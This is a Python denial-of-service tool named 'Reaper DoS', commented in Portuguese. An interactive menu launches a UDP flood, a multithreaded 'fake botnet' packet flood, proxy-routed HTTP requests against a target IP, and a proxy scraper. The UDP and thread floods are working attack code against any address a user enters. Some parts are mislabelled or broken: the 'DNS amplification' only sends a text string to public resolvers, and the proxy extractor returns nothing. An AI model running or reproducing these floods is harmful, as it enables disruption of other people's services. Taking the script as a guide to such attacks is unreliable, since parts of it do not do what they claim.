import threading
import socket
import random
import time
import requests
import os
import sys

# Morte ceifadora ASCII Art
reaper_art = r"""
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#            
   
      🧹 Reaper DoS - Lucas Navarro 🧹
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def menu():
    clear_screen()
    print(reaper_art)
    print("\n=== MENU DE ATAQUES ===")
    print("[1] UDP Flood")
    print("[2] DNS Amplification Attack")
    print("[3] HTTP Amplification (Proxy Attack)")
    print("[4] Scraper de Proxies Automático")
    print("[5] Iniciar Botnet Fake (Multi PC)")
    print("[0] Sair")
    choice = input("\nEscolha o ataque: ")
    return choice

# ==============================
# FUNÇÕES PARA OS ATAQUES
# ==============================

# UDP Flood
def udp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Pacote UDP de 1024 bytes
    while True:
        client.sendto(bytes, (target_ip, target_port))
        print(f"Pacote UDP enviado para {target_ip}:{target_port}")

# DNS Amplification
def dns_amplification(target_ip):
    dns_servers = [
        "8.8.8.8", "8.8.4.4",  # Google DNS
        "1.1.1.1", "1.0.0.1"   # Cloudflare DNS
    ]
    domain = "example.com"  # Pode colocar qualquer domínio aqui
    for dns in dns_servers:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = f"Domain request: {domain}".encode('utf-8')
        client.sendto(message, (dns, 53))  # Porta DNS 53
        client.close()
        print(f"Amplificação DNS enviada para {dns}")

# HTTP Amplification via Proxy
def http_amplification(target_ip, proxies):
    url = f"http://{target_ip}/"
    for proxy in proxies:
        try:
            proxy_dict = {
                "http": proxy,
                "https": proxy
            }
            response = requests.get(url, proxies=proxy_dict)
            print(f"Requisição HTTP enviada via Proxy: {proxy}")
        except Exception as e:
            print(f"Erro com proxy {proxy}: {e}")

# Proxy Scraper (Busca proxies públicos)
def proxy_scraper():
    proxy_list = []
    url = "https://www.us-proxy.org/"
    response = requests.get(url)
    if response.status_code == 200:
        # Filtrando os proxies diretamente do HTML (usando regex ou BeautifulSoup)
        proxy_list = extract_proxies(response.text)
        print(f"Proxies encontrados: {len(proxy_list)}")
    else:
        print("Falha ao buscar proxies.")
    return proxy_list

def extract_proxies(html):
    # Lógica para extrair proxies a partir do HTML da página
    proxies = []
    # A lógica real deve ser implementada aqui com regex ou BeautifulSoup para pegar proxies
    return proxies

# Botnet Fake (simula uma botnet local com múltiplas threads)
def fake_botnet(target_ip, target_port, num_bots):
    def bot_task():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            client.sendto(b"Bot Packet", (target_ip, target_port))
            print("Bot Fake enviando pacotes...")
    
    for i in range(num_bots):
        threading.Thread(target=bot_task).start()
        print(f"Bot Fake #{i+1} iniciado.")

# ==============================
# CONTROLE DO MENU E ATACOS
# ==============================

def start_attack():
    while True:
        opt = menu()

        if opt == "1":
            target_ip = input("Digite o IP do alvo: ")
            target_port = int(input("Digite a porta do alvo: "))
            threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
        elif opt == "2":
            target_ip = input("Digite o IP do alvo: ")
            threading.Thread(target=dns_amplification, args=(target_ip,)).start()
        elif opt == "3":
            target_ip = input("Digite o IP do alvo: ")
            proxies = proxy_scraper()
            threading.Thread(target=http_amplification, args=(target_ip, proxies)).start()
        elif opt == "4":
            proxies = proxy_scraper()
            print(f"Proxies: {proxies}")
        elif opt == "5":
            target_ip = input("Digite o IP do alvo: ")
            target_port = int(input("Digite a porta do alvo: "))
            num_bots = int(input("Quantos bots? "))
            fake_botnet(target_ip, target_port, num_bots)
        elif opt == "0":
            print("Encerrando o ataque... ☠️")
            break
        else:
            print("Opção inválida.")
        
        input("\nPressione Enter para voltar ao menu...")

if __name__ == "__main__":
    start_attack()
